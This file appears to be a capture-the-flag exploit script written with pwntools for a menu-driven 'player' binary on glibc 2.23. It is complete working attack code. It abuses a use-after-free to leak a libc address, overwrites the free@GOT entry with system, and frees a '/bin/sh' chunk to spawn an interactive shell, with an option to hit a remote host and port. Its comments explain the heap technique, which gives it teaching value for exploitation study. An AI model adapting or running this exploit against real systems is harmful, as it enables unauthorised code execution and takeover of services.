from pwn import *

BINARY = './main_patched.elf'
LIBC = './libc.so.6'
LD = './ld-2.23.so'

DEBUG = False

def alloc(name, attack = 1, 
		  defense = 2, speed = 3, precision = 4):

	p.recvuntil('choice: ')
	p.sendline('1')

	p.recvuntil('name: ')
	p.sendline(name)

	p.recvuntil('points: ')
	p.sendline(str(attack))

	p.recvuntil('points: ')
	p.sendline(str(defense))

	p.recvuntil('speed: ')
	p.sendline(str(speed))

	p.recvuntil('precision: ')
	p.sendline(str(precision))

	return

def edit(name):

	p.recvuntil('choice: ')
	p.sendline('4')

	p.recvuntil('choice: ')
	p.sendline('1')

	p.recvuntil('name: ')
	p.sendline(name)

	p.recvuntil('choice: ')
	p.sendline('0')

	return

def select(idx):

	p.recvuntil('choice: ')
	p.sendline('3')

	p.recvuntil('index: ')
	p.sendline(str(idx-1))

	return

def free(idx):

	p.recvuntil('choice: ')
	p.sendline('2')

	p.recvuntil('index: ')
	p.sendline(str(idx-1))

	return

def show():

	p.recvuntil('choice: ')
	p.sendline('5')

	return

def pwn():

	alloc(b'A'*200)
	alloc(b'B'*200) # The size is important to allocate a small/large bin so it will become an unsorted bin
	alloc(b'/bin/sh') # This name will be sent to system()
	

	select(1)

	free(1) # Frees selected player, but we can still read its name
	free(2)

	show() # Prints deleted player's name, which now points to libc's __main_arena__

	p.recvuntil('Name: ')

	'''
	Libc 2.23 leak
	This libc version does not set to 0 the whole chunk when free'd
	If we select player 3 and then we remove it, the program will first free the name string and, then,
	free the struct chunk.
	Because of the sizes, player name's pointer is not removed from the struct, so if we show() the player, the
	program will print the content of the string, although it was already free'd.

	Chunks bigger than 0x80 will be stored as small bins

	The issue here comes when the name free'd chunk is bigger than a fastbin. If this happens, the struct chunk is stored
	as a fastbin, while the name chunk is stored as a small/unsorted bin.

	The main difference between fast and unsorted bins is that the first one is a single-linked list, while the second one is a double linked list.

	So the name unsorted bin chunk will contain a pointer to the next and the previous bins but, since this is the only unsorted bin,
	both pointers are the same: main_arena from libc.

	If the name we use is short, it will be stored as a fastbin, as a single-linked list element, so it will only point to 
	the next bin which, for the moment, does not exist.

	'''

	leak = u64(p.recv(6).ljust(8, b'\x00')) # main_arena leak


	'''
	Calculating libc base from leak.
	Once we get a leak, we can pause the execution, get the current libc base at runtime and substract this base from the leak,
	obtaining the offset.
	'''
	offset = 0x3C4B78
	libc_base = leak - offset

	log.info("Leak: 0x{:x}".format(leak))
	log.info("Libc base: 0x{:x}".format(libc_base))



	'''
	PWNTIME!
	We can now create a new user, which name will overwrite the name pointer of the first player. To do so, our payload
	needs to fit inside a struct chunk, which have 0x20 size.

	This is because the first-fit algorithm. The struct chunk for this new player will be allocated inside the fastbin of player 2.
	The name, however, will be allocated in the next available fastbin, which is player 1's struct chunk. Therefore, we'll be able
	to modify this struct using edit() (remember player 1 is still selected).

	A player struct has the following structure (QWORDS):

	| attack / deffense | speed / precision |
	|     name_ptr      |        size       |

	If we use add(b'D' * 8 * 2, p64(free@got)), we'll obtain:

	| 0x4444444444444444 | 0x4444444444444444 |
	|     0x603018       |        JUNK        |

	So now the name pointer is actually pointing to free@got. If we edit the player's name, it will modify the content of this pointer,
	which is GOT's entry for free function. So if we use
	edit(p64(system@libc))
	We will be modifying the free entry at the GOT. So next time we call free(name_ptr), we will be actually calling system(name_ptr).

	Remember now the user you created with name /bin/sh. If we free this user, we will be calling system('/bin/sh').

	'''

	# Set libc base and getting libc's system at runtime
	libc = ELF(LIBC, checksec=False)
	libc.address = libc_base
	system = libc.sym["system"]

	# Obtaining GOT's offset for free()
	elf = ELF(BINARY, checksec=False)
	free_got = elf.got['free']

	log.info("Libc's system: 0x{:x}".format(system))
	log.info("free got: 0x{:x}".format(free_got))

	# Now this string will point to free@got
	alloc(b'Z'*8 *2 + p64(free_got))


	# Now free@got will be modified and will point to system@libc
	edit(p64(system))

	# Frees the '/bin/sh' player and launches a shell
	free(3)

	log.warn('PWNED!')
	p.interactive()


	return




if __name__ == "__main__":
	log.warn("IMPORTANT: Make sure your binary has been patched and is using the correct version of libc and ld loader!")

	log.info("For remote: %s HOST PORT" % sys.argv[0])
	log.info("For debug: %s -d\n" % sys.argv[0])

	if len(sys.argv) > 2:
		p = remote(sys.argv[1], int(sys.argv[2]))
		pwn()

	else:

		# Debug
		if len(sys.argv) > 1 and sys.argv[1] == '-d':
			p = gdb.debug(BINARY,'''
			add-symbol-file {}
			b menu
			b add_player
			b delete_player
			b show_playerS
			b edit_player
			'''.format(BINARY))

		else:
			p = process(BINARY)
			pause()

		pwn()
